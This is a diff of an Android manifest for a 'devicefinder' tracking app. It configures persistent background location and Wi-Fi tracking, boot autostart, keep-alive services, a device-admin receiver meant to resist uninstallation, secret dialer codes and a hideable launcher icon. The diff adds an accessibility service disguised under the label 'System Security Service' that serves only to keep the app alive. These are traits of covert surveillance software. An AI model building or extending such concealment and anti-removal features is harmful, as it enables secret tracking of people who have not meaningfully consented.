@@ -1,14 +1,13 @@
 <?xml version="1.0" encoding="utf-8"?>
 <!-- 
 ======================================================================
-  AndroidManifest.xml 修改记录 (2026-11-04)
-  1. 新增 FOREGROUND_SERVICE_DATA_SYNC 权限，适配 Android 14+ 降级机制。
-  2. TrackingService 增加 dataSync 前台类型，防止 Android 14+ 降级时闪退。
-  3. 移除 NEARBY_WIFI_DEVICES 的 neverForLocation 标记，防止极端情况下 BSSID 被系统脱敏。
+  AndroidManifest.xml 修改记录 (2026-11-06)
+  1. 修正无障碍 Action 和 Meta-data 名称，使其能被系统正确识别。
+  2. MainActivity 增加 launchMode="singleTask" 和 configChanges，防止多实例和状态丢失。
+  3. 移除 manifest 标签中的 package 属性，以适配最新版 AGP。
 ======================================================================
 -->
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.example.devicefinder">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
     <!-- 基础网络与定位 -->
     <uses-permission android:name="android.permission.INTERNET" />
@@ -16,10 +15,10 @@
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
     
-    <!-- UDP 广播/组播本地自救所必须的 Multicast 权限 (20261103) -->
+    <!-- UDP 广播/组播本地自救所必须的 Multicast 权限 -->
     <uses-permission android:name="android.permission.CHANGE_WIFI_MULTICAST_STATE" />
     
-    <!-- ★ [修复] 2026-11-04 移除 neverForLocation，确保后台 WiFi 扫描结果不被系统沙盒强制脱敏（保障后端 WiFi 定位准确） -->
+    <!-- 确保后台 WiFi 扫描结果不被系统沙盒强制脱敏 -->
     <uses-permission android:name="android.permission.NEARBY_WIFI_DEVICES" />
     
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
@@ -32,8 +31,6 @@
     <!-- 前台服务与保活 -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
-    
-    <!-- ★ [修复] 2026-11-04 增补 Android 14+ 核心前台 dataSync 权限，对应 Java 代码 startForeground 失败时的容错降级 -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
@@ -56,8 +53,6 @@
         android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar">
 
         <!-- 核心追踪服务 -->
-        <!-- ★ [修复] 2026-11-04 修改为 foregroundServiceType="location|dataSync"。
-             完美适配 Java 层 startForeground 的 dataSync 降级机制，防止 Android 14+ 闪退 -->
         <service
             android:name=".TrackingService"
             android:enabled="true"
@@ -65,27 +60,27 @@
             android:stopWithTask="false"
             android:foregroundServiceType="location|dataSync" />
 
-        <!-- 保活 JobService 声明 (20261104 13:27) -->
+        <!-- 保活 JobService 声明 -->
         <service
             android:name=".KeepAliveJobService"
             android:permission="android.permission.BIND_JOB_SERVICE"
             android:exported="false" />
       
-        <!-- ★ [新增] 2026-11-05 终极金身：无障碍保活服务
-             仅做保活外壳，不监听屏幕内容；由 AccessibilityManagerService 系统级托管 -->
+        <!-- ★ [修复] 2026-11-06 修正无障碍 Action 和 Meta-data 名称，使其能被系统正确识别 -->
         <service
             android:name=".MyAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="false">
+            android:exported="true"
+            android:label="系统安全服务（无障碍）">
             <intent-filter>
-                <action android:name="android.view.accessibility.AccessibilityService" />
+                <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
             <meta-data
-                android:name="android.view.accessibility.AccessibilityService"
+                android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- 开机自启：移除 directBootAware，等待 BOOT_COMPLETED（解锁后触发） -->
+        <!-- 开机自启 -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -107,7 +102,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- 低版本网络恢复广播（注：仅对 Android 7.0 以下生效，高版本由 NetworkCallback 接管） -->
+        <!-- 低版本网络恢复广播 -->
         <receiver
             android:name=".LegacyNetworkReceiver"
             android:enabled="true"
@@ -117,7 +112,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- 设备管理器（防普通手段轻松卸载） -->
+        <!-- 设备管理器 -->
         <receiver
             android:name=".MyDeviceAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
@@ -140,9 +135,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- 拨号盘暗号入口：
-             8866 主界面 / 7788 对讲机 / 5566 留言板 / 9900 强制上报
-             5678 老人模式切换（★新增）/ 4321 设备自检（★新增） -->
+        <!-- 拨号盘暗号入口 -->
         <receiver
             android:name=".DialerReceiver"
             android:enabled="true"
@@ -153,12 +146,12 @@
                 <data android:scheme="android_secret_code" android:host="7788" />
                 <data android:scheme="android_secret_code" android:host="5566" />
                 <data android:scheme="android_secret_code" android:host="9900" />
-                <data android:scheme="android_secret_code" android:host="5678" />  <!-- ★ 老人模式切换 -->
-                <data android:scheme="android_secret_code" android:host="4321" />  <!-- ★ 设备自检通知 -->
+                <data android:scheme="android_secret_code" android:host="5678" />
+                <data android:scheme="android_secret_code" android:host="4321" />
             </intent-filter>
         </receiver>
 
-        <!-- 局域网聊天界面：adjustResize 顶起键盘，excludeFromRecents 防划死 -->
+        <!-- 局域网聊天界面 -->
         <activity
             android:name=".ChatActivity"
             android:exported="true"
@@ -168,35 +161,22 @@
 
         <!--
             权限引导主界面
-            ⚠️ configChanges 与 launchMode 说明（2026-11-06 更新，禁止随意删除）：
-            
-            1. configChanges：MainActivity 引导流程是有状态的，旋转屏幕、分屏等配置变更
-               默认会触发 Activity 重建 → 状态重置 → 流程重走。configChanges 挡住这些"可预测的重建"。
-            2. launchMode="singleTask"：防止用户跳转设置页后按 Home，再点图标进来时新建实例，
-               导致新旧两个实例同时存在，叠出两个无障碍弹框。
-               
-            两者与代码中的 onSaveInstanceState 互补：
-              - configChanges  → 挡住旋转 / 分屏等主动重建
-              - launchMode     → 挡住多入口重复拉起产生的多实例
-              - onSaveInstanceState → 挡住系统内存压力回收后的被动重建
+            ⚠️ configChanges 与 launchMode 说明（禁止随意删除）：
+            1. configChanges：防止旋转屏幕触发 Activity 重建导致流程重走。
+            2. launchMode="singleTask"：防止多入口重复拉起导致多实例叠弹框。
         -->
-        <!-- ★ [修复] 2026-11-06 修正无障碍 Action 和 Meta-data 名称，使其能被系统正确识别 -->
-        <service
-            android:name=".MyAccessibilityService"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+        <activity
+            android:name=".MainActivity"
             android:exported="true"
-            android:label="系统安全服务（无障碍）">
+            android:launchMode="singleTask"
+            android:configChanges="orientation|screenSize|keyboardHidden|smallestScreenSize|screenLayout">
             <intent-filter>
-                <!-- 正确写法：android.accessibilityservice.AccessibilityService -->
-                <action android:name="android.accessibilityservice.AccessibilityService" />
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
-            <!-- 正确写法：android.accessibilityservice -->
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_service_config" />
-        </service>
+        </activity>
 
-        <!-- 桌面启动别名（供 LauncherIconUtils 动态显示/隐藏图标） -->
+        <!-- 桌面启动别名 -->
         <activity-alias
             android:name=".VisibleAliasActivity"
             android:enabled="true"
